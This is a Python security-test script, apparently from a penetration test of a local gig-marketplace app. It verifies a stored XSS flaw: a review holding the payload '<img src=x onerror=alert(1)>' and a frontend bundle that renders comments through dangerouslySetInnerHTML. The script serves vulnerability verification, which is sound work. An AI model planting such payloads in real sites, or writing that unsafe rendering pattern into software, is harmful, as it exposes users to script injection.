"""
WSTG-INPV-02: Stored XSS in public review comments.

Verifies the exploit chain:
1. A public review contains an HTML payload with an event handler.
2. A public gig belongs to the same reviewed seller.
3. The live frontend bundle renders review comments with dangerouslySetInnerHTML.

Expected:
- The malicious review payload is present in API output
- The affected gig is public and tied to the same seller
- The bundle contains review-text rendering via dangerouslySetInnerHTML
"""

from __future__ import annotations

import requests


BASE = "http://localhost:3000"
SELLER_ID = "8a5b0a66-b192-4364-94e5-188a7657c1fa"
GIG_ID = "698c5387912d2f005a47a747"
PAYLOAD = "<img src=x onerror=alert(1)>"


def main() -> None:
    gig = requests.get(f"{BASE}/api/gigs/{GIG_ID}", timeout=10)
    gig.raise_for_status()
    gig_body = gig.json()
    seller_id = gig_body.get("freelancer_id") or gig_body.get("seller_id")
    print(f"[+] Gig seller_id: {seller_id}")
    assert seller_id == SELLER_ID, "Expected gig to belong to the target seller"

    reviews = requests.get(f"{BASE}/api/reviews", params={"reviewee_id": SELLER_ID}, timeout=10)
    reviews.raise_for_status()
    review_list = reviews.json()["reviews"]
    malicious = next((r for r in review_list if PAYLOAD in (r.get("comment") or "")), None)
    assert malicious is not None, "Expected malicious review payload in public reviews"
    print(f"[+] Malicious review id: {malicious['id']}")
    print(f"[+] Malicious comment: {malicious['comment']}")

    bundle = requests.get(f"{BASE}/assets/index-CtZsj9EZ.js", timeout=10)
    bundle.raise_for_status()
    snippet = 'review-text",dangerouslySetInnerHTML:{__html:b.comment}'
    assert snippet in bundle.text, "Expected dangerous review rendering in live bundle"
    print(f"[+] Found bundle sink: {snippet}")

    print("\n[VULNERABLE] Stored review HTML reaches a dangerouslySetInnerHTML sink")


if __name__ == "__main__":
    main()
